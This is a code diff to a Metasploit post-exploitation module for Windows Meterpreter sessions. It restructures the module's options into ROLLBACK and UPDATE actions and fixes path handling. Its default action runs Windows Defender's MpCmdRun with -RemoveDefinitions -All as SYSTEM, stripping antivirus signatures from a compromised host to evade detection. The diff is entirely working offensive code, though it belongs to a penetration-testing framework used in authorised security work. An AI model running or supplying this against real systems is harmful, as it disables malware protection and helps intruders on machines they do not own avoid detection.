@@ -28,6 +28,11 @@ class MetasploitModule < Msf::Post
         ], # Module author
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Actions' => [
+          [ 'ROLLBACK', { 'Description' => 'Rollback Defender signatures' } ],
+          [ 'UPDATE', { 'Description' => 'Update Defender signatures' } ]
+        ],
+        'DefaultAction' => 'ROLLBACK',
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -35,48 +40,57 @@ class MetasploitModule < Msf::Post
             ]
           }
         },
+        'Notes' => {
+          # if you rollback the signatures, that resource is lost
+          'Stability' => [SERVICE_RESOURCE_LOSS],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
       )
-    )
-    register_options(
-      [
-        OptEnum.new('ACTION', [ true, 'Action to perform (Update/Rollback)', 'Rollback', ['rollback', 'update']])
-      ]
     )
   end
 
   def run
     # Are we system?
-    if not is_system?()
-      fail_with(Failure::NoAccess, "You must be System to run this Module")
+    if !is_system?
+      fail_with(Failure::NoAccess, 'You must be System to run this Module')
     end
+
     # Is the binary there?
-    program_path = session.sys.config.getenv('ProgramFiles')
+    if client.arch == ARCH_X86 && client.arch != sysinfo['Architecture']
+      program_path = session.sys.config.getenv('ProgramW6432')
+    else
+      program_path = session.sys.config.getenv('ProgramFiles')
+    end
     vprint_status("program_path = #{program_path}")
     file_path = program_path + '\Windows Defender\MpCmdRun.exe'
     vprint_status("file_path = #{file_path}")
-    if not exist?(file_path)
+    if !exist?(file_path)
       fail_with(Failure::NoAccess, "#{file_path} is not Present")
     end
     # Is defender even enabled?
-    defender_disable_key = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
-    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, "DisableAntiSpyware", REGISTRY_VIEW_NATIVE)
-    if disable_key_value.nil? || disable_key_value != 1
-      print_status("Removing All Definitions for Windows Defender")
-      print_status(datastore['ACTION'])
-      if datastore['ACTION'].casecmp('Rollback') == 0
-        cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
-      else
-        cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
-      end
-      print_status("Running #{cmd}")
-      output = cmd_exec(cmd)
-      if output.include?('denied')
-        print_bad("#{output}")
-      else
-        print_status("#{output}")
-      end
+    defender_disable_key = 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender'
+    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, 'DisableAntiSpyware', REGISTRY_VIEW_NATIVE)
+    unless disable_key_value.nil? || disable_key_value != 1
+      fail_with(Failure::NoTarget, 'Defender is not enabled')
+    end
+
+    case action.name
+    when 'ROLLBACK'
+      print_status('Removing all definitions for Windows Defender')
+      cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
+    when 'UPDATE'
+      print_status('Updating definitions for Windows Defender')
+      cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
     else
-      fail_with(Failure::BadConfig, "Defender is not Enabled")
+      fail_with(Failure::BadConfig, 'Unknown action provided!')
+    end
+    print_status("Running #{cmd}")
+    output = cmd_exec(cmd).to_s
+    if output.include?('denied')
+      print_bad(output)
+    else
+      print_status(output)
     end
   end
 end
